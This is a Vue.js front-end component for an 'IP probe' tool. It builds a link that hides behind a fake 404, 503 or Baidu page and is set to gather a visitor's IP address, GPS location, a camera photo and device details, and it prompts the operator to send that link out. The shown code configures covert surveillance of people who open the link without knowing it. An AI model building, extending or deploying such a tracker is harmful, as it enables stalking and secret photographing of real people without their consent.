<template>
    <div id="main">
        <el-menu default-active="1" class="el-menu-demo" mode="horizontal" @select="selectHandle">
    <el-menu-item index="1">IP探针</el-menu-item>
    <el-menu-item index="2">探针查询</el-menu-item>
    </el-menu>
        <el-form label-width="80px">
            <el-form-item label="查询密钥">
                <el-input v-model="form.key" placeholder="请输入查询密钥" style="width: 80%"></el-input>
                <el-button type="primary" @click="getRandomKey">生成随机密钥</el-button>
            </el-form-item>
            <el-form-item label="探针页面">
                <el-select v-model="form.page" placeholder="请选择跳转页面">
                    <el-option label="404" value="404"></el-option>
                    <el-option label="503" value="503"></el-option>
                    <el-option label="百度一下" value="baidu"></el-option>
                    <el-option label="自定义页面" value=""></el-option>
                </el-select>
                <el-input v-model="form.pageUrl" placeholder="请输入自定义跳转页面" v-if="!form.page" style="width: 70%"></el-input>
            </el-form-item>
            <el-form-item label="探针功能">
                <el-checkbox-group v-model="form.type">
                    <el-checkbox label="IP查询" name="ip" checked></el-checkbox>
                    <el-checkbox label="GPS定位" name="gps"></el-checkbox>
                    <el-checkbox label="摄像头拍照" name="camera"></el-checkbox>
                    <el-checkbox label="设备查询" name="browser"></el-checkbox>
                </el-checkbox-group>
            </el-form-item>
            <el-form-item>
                <el-button type="primary" @click="onSubmit" :loading="isLoading">提交</el-button>
                <el-button>取消</el-button>
            </el-form-item>
        </el-form>
        <el-dialog
        title="提示"
        :visible.sync="isInDatabase"
        width="30%"
        >
        <span>现在，您可以将 {{ probeUrl }} 发送。</span>
        <span slot="footer" class="dialog-footer">
            <el-button @click="isInDatabase = false">取 消</el-button>
            <el-button type="primary" @click="isInDatabase = false">确 定</el-button>
        </span>
        </el-dialog>
        <el-divider></el-divider>
        <span>Hurry 2022-2023</span>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
import axios from 'axios'
export default {
    data(){
        return {
            form:{
                key: "",
                page:"404",
                pageUrl:"",
                type:[]
            },
            isLoading:false,
            isInDatabase:false
        }
    },
    computed:{
        probeUrl(){
            var relUrl = window.location.href;
            var index = relUrl.indexOf("index.html");
            if(index != -1){
                relUrl = relUrl.substring(0,index);
            }
            return relUrl+"probe.php?key=" + this.form.key
        }
    },
    methods:{
        getRandomKey(){
            this.form.key = nanoid()
        },
        onSubmit(){
            var ip='0'
            var gps='0'
            var camera='0'
            var browser='0'
            var customUrl=''
            if(this.form.page.trim() === ""){
                if(this.form.pageUrl !== ""){
                    customUrl = this.form.pageUrl
                }else{
                    this.$message.error("自定义页面不能为空")
                    return
                }
            }else{
                customUrl = this.form.page
            }
            if(this.form.key.trim() == ""){
                this.$message.error("Key不能为空")
                return
            }
            if(this.form.type.indexOf("IP查询")!==-1){
                ip = '1'
            }
            if(this.form.type.indexOf("GPS定位")!==-1){
                gps = '1'
            }
            if(this.form.type.indexOf("摄像头拍照")!==-1){
                camera='1'
            }
            if(this.form.type.indexOf("设备查询")!==-1){
                browser='1'
            }
            if(ip === '0' && gps === '0' && camera === '0' && browser === '0'){
                this.$message.error("探针不能为空")
                return
            }
            this.isLoading = true;
            var postUrl = "./modules/webModules/writeInformation.php"
            var params = new URLSearchParams();
            params.append('gps', gps);
            params.append('ip', ip);
            params.append('camera', camera);
            params.append('browser', browser);
            params.append('url', customUrl);
            params.append('key', this.form.key);
            axios.post(postUrl, params).then(
                response => {
                    if(response.data.code === 200){
                    this.isLoading=false
                    this.$message({
                        message: response.data.msg,
                        type: 'success'
                    })
                    // 加载一个卡片
                    this.isInDatabase = true;
                }else{
                this.isLoading=false
                this.$message.error(response.data.msg)
                }},
                error => {
                    this.isLoading=false
                    this.$message.error(error.message)
                }
            )
        },
        selectHandle(index){
            var relUrl = window.location.href;
            var index2 = relUrl.indexOf("index.html");
            if(index2 != -1){
                relUrl = relUrl.substring(0,index);
            }
            index2 = relUrl.indexOf("probe_query.html");
            if(index2 != -1){
                relUrl = relUrl.substring(0,index2);
            }
            if(index == 1){
                window.location.href=relUrl
            }else if(index == 2){
                window.location.href=relUrl + "probe_query.html"
            }
        }
    }
}
</script>

<style>

</style>